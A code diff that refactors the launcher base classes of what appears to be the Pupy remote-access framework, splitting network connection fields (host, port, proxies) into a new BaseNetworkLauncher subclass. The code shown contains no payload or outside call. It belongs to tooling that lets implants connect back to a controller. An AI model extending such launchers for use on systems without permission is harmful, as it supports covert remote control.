@@ -6,7 +6,8 @@ launchers bring an abstraction layer over transports to allow pupy payloads to t
 """
 
 __all__ = (
-    'LauncherError', 'LauncherArgumentParser', 'BaseLauncher'
+    'LauncherError', 'LauncherArgumentParser', 'BaseLauncher',
+    'BaseNetworkLauncher'
 )
 
 import argparse
@@ -41,8 +42,8 @@ class BaseLauncher(object):
     name = None
 
     __slots__ = (
-        'args', 'host', 'hostname', 'port',
-        '_transport', 'proxies', '_default_transport'
+        'args', '_transport', '_default_transport',
+        '_connection_info_args', '_connection_info_kwargs'
     )
     __metaclass__ = BaseLauncherMetaclass
 
@@ -50,6 +51,8 @@ class BaseLauncher(object):
         self.args = None
         self.reset_connection_info()
         self._default_transport = None
+        self._connection_info_args = []
+        self._connection_info_kwargs = {}
 
     def iterate(self):
         ''' iterate must be an iterator returning rpyc stream instances '''
@@ -74,7 +77,25 @@ class BaseLauncher(object):
     def transport(self):
         return self._transport or self._default_transport
 
+    def set_connection_info(self, *args, **kwargs):
+        self._connection_info_args = args
+        self._connection_info_kwargs = kwargs
+
+    def reset_connection_info(self):
+        self._connection_info_args = []
+        self._connection_info_kwargs = {}
+
+
+class BaseNetworkLauncher(BaseLauncher):
+    __slots__ = (
+        'host', 'hostname', 'port', 'proxies'
+    )
+
     def set_connection_info(self, hostname, host, port, proxies, transport=None):
+        super(BaseNetworkLauncher, self).set_connection_info(
+            hostname, host, port, proxies, transport=transport
+        )
+
         self.hostname = hostname
         self.host = host
         self.port = port
@@ -82,6 +103,8 @@ class BaseLauncher(object):
         self._transport = transport
 
     def reset_connection_info(self):
+        super(BaseNetworkLauncher, self).reset_connection_info()
+
         self.hostname = None
         self.host = None
         self.port = None
